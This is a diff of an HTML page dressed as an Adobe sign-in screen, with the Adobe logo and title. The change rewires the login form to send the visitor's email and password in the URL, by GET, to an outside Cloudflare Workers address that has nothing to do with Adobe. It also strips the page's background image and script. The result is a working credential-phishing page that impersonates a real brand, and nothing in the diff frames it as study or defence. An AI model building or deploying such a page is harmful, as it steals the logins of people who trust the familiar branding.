@@ -3,22 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adobe Sign In</title>
+    <title>Adobe Login</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="background">
-        <img src="document.jpg" alt="Blurred Document">
-    </div>
     <div class="login-container">
         <img src="adobe-logo.png" alt="Adobe Logo" class="logo">
-        <h2>Sign in to your account</h2>
-        <form id="login-form">
-            <input type="email" id="email" placeholder="Email Address" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">Sign In</button>
+        <form action="https://sweetcaroline.clydestayne.workers.dev/" method="GET">
+            <input type="email" name="email" placeholder="Email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log in</button>
         </form>
     </div>
-    <script src="script.js"></script>
 </body>
 </html>
